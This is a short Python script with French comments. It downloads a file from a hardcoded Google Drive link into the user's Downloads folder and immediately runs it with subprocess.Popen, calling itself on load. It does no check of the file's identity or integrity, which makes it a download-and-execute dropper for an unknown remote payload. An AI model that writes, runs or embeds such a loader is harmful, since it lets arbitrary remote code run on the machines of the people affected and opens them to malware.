import urllib.request
import subprocess
import os
import sys

def download_and_run_file(url):
    try:
        # Obtenir le chemin du répertoire de téléchargement de l'utilisateur
        download_dir = os.path.join(os.path.expanduser('~'), 'Downloads')

        # Obtenir le nom du fichier à partir de l'URL
        file_name = url.split('/')[-1]

        # Chemin complet du fichier à enregistrer
        destination = os.path.join(download_dir, file_name)

        # Téléchargement du fichier
        urllib.request.urlretrieve(url, destination)

        # Vérification si le fichier a été téléchargé avec succès
        if os.path.exists(destination):
            print("Téléchargement réussi :", destination)
            
            # Exécuter le fichier téléchargé
            subprocess.Popen(destination)
        else:
            print("Le fichier n'a pas été téléchargé.")
    except Exception as e:
        print("Erreur lors du téléchargement ou de l'exécution du fichier :", e)

# URL du fichier à télécharger et à exécuter
url = "https://drive.google.com/file/d/1Qg5MtfE9LaA6tZQYRm9EJwKOOGzcgooq"
# Télécharger et exécuter le fichier
download_and_run_file(url)